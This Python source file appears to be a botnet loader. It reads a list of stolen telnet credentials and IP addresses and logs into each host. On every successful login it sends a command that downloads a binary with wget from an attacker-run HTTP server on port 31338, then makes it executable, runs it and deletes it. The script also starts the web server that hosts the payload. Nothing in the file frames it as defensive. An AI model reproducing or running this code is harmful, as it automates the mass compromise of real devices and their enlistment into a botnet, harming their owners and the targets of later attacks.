import telnetlib, sys, os, http.server, socketserver
# TODO : Kill Telnet service on ports 22, 23, 233, 2323

# modules
from libs import truecolors

__bin__ = "http://lololol:31338/bin/c34.py"
__webp_ = "31338"


def ServeHTTP():
        web_dir = os.path.join(os.path.dirname(__file__), 'bin')
        os.chdir(web_dir)
        Handler = http.server.SimpleHTTPRequestHandler
        httpd = socketserver.TCPServer(("", int(__webp_)), Handler)
        truecolors.print_info("Webserver started any:"+ __webp_)
        httpd.serve_forever()

def doConsumeLogin(ip, port, user, pass_):
    tn = None
    need_user = False
    while True:
        try:
            if not tn:
                asked_password_in_cnx = False
                tn = telnetlib.Telnet(ip, port)
                print ("[loader] Connection established to given ip %s"%ip)
            while True:
                response = tn.read_until(b":", 1)
                if "Login:" in str(response) or "Username:" in str(response):
                    print ("[loader] Received username prompt")
                    need_user = True
                    asked_password_in_cnx = False 
                    user, password = user, pass_
                    tn.write((user + "\n").encode('ascii'))
                elif "Password:" in str(response):
                    if asked_password_in_cnx and need_user:
                        tn.close()
                        break 
                    asked_password_in_cnx = True 
                    if not need_user:
                        user, password =  user, pass_
                    if not password:
                        print ("[loader] Login has failed...quitting.")
                        sys.exit(0)
                    print ("[loader] Received password prompt")
                    tn.write((password + "\n").encode('ascii'))
                if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                    # broken
                    print ("[loader] Login succeeded %s "%ip + ' : '.join((user, password)))
                    #response = tn.read_until(b"#", 1)
                    tn.write(("cd /tmp; cd/var/run; cd /mnt; cd/root; wget %s; chmod +x %s; ./%s; rm -rf %s;"%(__bin__, os.path.basename(__bin__), os.path.basename(__bin__), os.path.basename(__bin__)) + "\n").encode('ascii'))
                    print("[loader] Broken.")
                    break 
            if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                break
        except EOFError as e:
            tn = None
            need_user = False
            print("[scanner] Remote host dropped the connection (%s).."%str(e))

def ForceDB(fname):
    try:
        if os.path.isfile(fname):
            with open(fname) as f:
                for line in f:
                    usr  = line.split(':')[0].rstrip()
                    psw  = line.split(':')[1].rstrip()
                    ip   = line.split(':')[2].rstrip()
                    port = line.split(':')[3].rstrip()
                    doConsumeLogin(ip, port, usr, psw)
        else:
            truecolors.print_errn("Loader: File '%s' doesn't exists, check the path."%fname)
    except KeyboardInterrupt:
        truecolors.print_errn("Operation interrupted.")
    except Exception as e:
        truecolors.print_errn("Loader: " + str(e))
    
if len(sys.argv) >= 2:
    ServeHTTP()
    ForceDB(sys.argv[2])
else:
    truecolors.print_errn("Error: Unrecognized arguments.")
    sys.exit(1)